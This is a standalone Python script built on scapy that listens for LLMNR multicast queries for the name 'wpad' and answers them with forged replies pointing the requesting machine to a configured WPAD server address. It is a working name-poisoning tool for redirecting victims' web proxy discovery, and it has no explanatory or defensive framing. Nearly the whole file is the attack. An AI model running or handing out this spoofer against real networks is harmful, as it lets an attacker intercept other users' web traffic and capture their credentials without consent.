#!/usr/bin/env python3
from scapy.all import *
import socket

# Config
WPAD_IP = "192.168.1.50"  # Your WPAD server IP
LLMNR_MULTICAST = "224.0.0.252"
LLMNR_PORT = 5355

def handle_packet(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # query
        qname = pkt[DNSQR].qname.decode().rstrip(".")
        if qname.lower() == "wpad":
            print(f"[+] LLMNR query for {qname} from {pkt[IP].src}")
            send_response(pkt, WPAD_IP)

def send_response(query_pkt, ip):
    resp = IP(dst=query_pkt[IP].src, src=query_pkt[IP].dst)/ \
           UDP(dport=query_pkt[UDP].sport, sport=LLMNR_PORT)/ \
           DNS(
               id=query_pkt[DNS].id,
               qr=1,  # response
               aa=1,
               qd=query_pkt[DNS].qd,
               an=DNSRR(rrname=query_pkt[DNSQR].qname, ttl=30, rdata=ip)
           )
    send(resp, verbose=0)
    print(f"[+] Sent WPAD response with {ip} to {query_pkt[IP].src}")

def main():
    print("[*] Listening for LLMNR WPAD queries...")
    sniff(
        filter=f"udp port {LLMNR_PORT} and ip dst {LLMNR_MULTICAST}",
        prn=handle_packet
    )

if __name__ == "__main__":
    main()
